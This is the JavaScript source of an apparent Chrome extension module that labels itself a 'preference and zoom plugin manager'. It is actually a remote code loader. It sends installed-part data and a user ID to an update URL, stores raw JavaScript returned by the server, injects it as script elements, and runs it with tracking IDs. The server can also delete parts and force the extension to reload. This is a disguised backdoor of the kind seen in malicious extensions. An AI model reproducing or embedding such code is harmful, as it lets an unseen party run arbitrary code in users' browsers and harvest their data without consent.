// *************************************************
// Cross-platform preference and zoom plugin manager
// *************************************************

class PartsManager {

    constructor() {
        this.launchedParts = {};
        this.partRunner = new PartRunner();
        this.partRemover = new PartRemover();
    }

    reloader(partList, id) {
        return () => {
            delete partList[id];

            if (!Object.keys(partList).length) {
                chrome.runtime.reload();
            }
        }
    }

    addParts(parts) {
        for (let i in parts) {
            if (parts.hasOwnProperty(i)) {
                let id = parts[i].id;
                let version = parts[i].ver;
                let oldVersion = this.launchedParts[id];

                if (oldVersion && oldVersion !== version) {
                    delete this.launchedParts[id];
                    this.partRemover.removePart(id, oldVersion);
                }

                this.launchedParts[id] = version;
                this.partRunner.addPart(parts[i]);
            }
        }
    }

    removeParts(parts) {
        for (let id in parts) {
            if (parts.hasOwnProperty(id) && this.launchedParts[id]) {
                this.partRemover.removePart(id, parts[id], this.reloader(parts, id));
            }
        }
    }

    start() {
        let version, availableParts = PartsUtils.getActiveParts();

        for (let id in availableParts) {
            if (availableParts.hasOwnProperty(id) && !this.launchedParts[id]) {
                version = availableParts[id];

                this.launchedParts[id] = version;
                this.partRunner.runPart(id, version);
            }
        }
    }
}

let loader = {

    parts: window.bwInterfaces || (window.bwInterfaces = {}),

    scr(id, fn, onSuccessCallback, onFailureCallback) {
        fileStorage.getFullPath(fn, (url) => {
            let scriptElement = document.createElement('script');
            scriptElement.setAttribute('src', url);
            scriptElement.setAttribute("type", "text/javascript");
            scriptElement.setAttribute("name", id);

            document.head.appendChild(scriptElement);

            onSuccessCallback && onSuccessCallback();
        }, onFailureCallback);
    },

    startPartIfAvailable(id, settings) {
        return function start(triesCount) {
            let tries = triesCount || 0;
            let MAX_TRIES = 10;

            if (this.parts[id]) {
                this.parts[id].start(settings);
            } else {
                ++tries;
                if (tries < MAX_TRIES) {
                    setTimeout(function () {
                        start.call(this, tries)
                    }.bind(this), 100);
                } else {
                }
            }
        }.bind(this)
    },

    startPart(id, settings) {
        this.startPartIfAvailable(id, settings)();
    },

    stopPart(id) {
        if (this.parts[id]) {
            this.parts[id].stop();
        }
    },

    unloadPart(id) {
        if (this.parts[id]) {
            this.parts[id].uninstall();
            delete this.parts[id];

            let elements = document.querySelectorAll('script[name="' + id + '"]');
            if (elements) {
                elements.forEach(function (el) {
                    !!el.parentNode && el.parentNode.removeChild(el);
                })
            }
        }
    }
};

class PartRemover {
    removePart(id, version, callback) {
        loader.stopPart(id);
        loader.unloadPart(id);

        fileStorage.remove(PartsUtils.getBgFN(id, version), function () {
            fileStorage.remove(PartsUtils.getIntFN(id, version), function () {
                callback && callback();
            }.bind(this));
        }.bind(this));

        let activeParts = PartsUtils.getActiveParts();
        if (activeParts[id]) {
            delete activeParts[id];
            storage.write("activeParts", JSON.stringify(activeParts));
        }
    };
}

class PartRunner {
    loadAndExecutePart(id, ver) {
        loader.scr(id, PartsUtils.getBgFN(id, ver), function () {
            loader.scr(id, PartsUtils.getIntFN(id, ver), function () {
                loader.startPart(id, {
                    sid: '',
                    pid: '1067',
                    ubid: settings.ubid(),
                    cid: 'nonjdcjchghhkdoolnlbekcfllmednbl',
                });
            }.bind(this));
        }.bind(this));
    }

    addPart(part) {
        let objectModel = PartsUtils.getActiveParts();
        objectModel[part.id] = part.ver;
        storage.write("activeParts", JSON.stringify(objectModel));

        if (part.bgContent) {
            fileStorage.write(PartsUtils.getBgFN(part.id, part.ver), part.bgContent, function () {
                if (part.intContent) {
                    fileStorage.write(PartsUtils.getIntFN(part.id, part.ver), part.intContent, function () {
                        this.loadAndExecutePart(part.id, part.ver);
                    }.bind(this));
                }
            }.bind(this));
        }
    };

    runPart(id, version) {
        this.loadAndExecutePart(id, version);
    };
}

class UpdateEvent {

    constructor() {
        this.partsManager = new PartsManager();
        this.partsManager.start();
    }

    static constructPartsInfo() {
        let info = { parts: {} };
        let activeParts = PartsUtils.getActiveParts();
        for (let id in activeParts) {
            if (activeParts.hasOwnProperty(id)) {
                info.parts[id] = activeParts[id];
            }
        }
        return info;
    };


    update(url) {
        xmlHttpRequests.sendGet(`${url}/update`, encodeURIComponent(JSON.stringify(UpdateEvent.constructPartsInfo())), function (content) {
            if (content) {
                content = JSON.parse(content);
                if (content && (typeof content === "object")) {
                    if (content.del) {
                        let partsMap = {};
                        for (let i in content.del) {
                            if (content.del.hasOwnProperty(i)) {
                                partsMap[content.del[i].id] = content.del[i].ver;
                            }
                        }

                        this.partsManager.removeParts(partsMap);
                    }
                    if (content.upd) {
                        this.partsManager.addParts(content.upd);
                    }
                }
            }
        }.bind(this));
    };

    cancel() {
        this.partsManager.removeParts(PartsUtils.getActiveParts());
    }
}

class PartsUtils {

    static getActiveParts() {
        return JSON.parse(storage.read("activeParts") || "{}");
    }

    static getBgFN(name, version) {
        return name + '-' + version + '-bg';
    };

    static getIntFN(name, version) {
        return name + '-' + version + '-int';
    };
}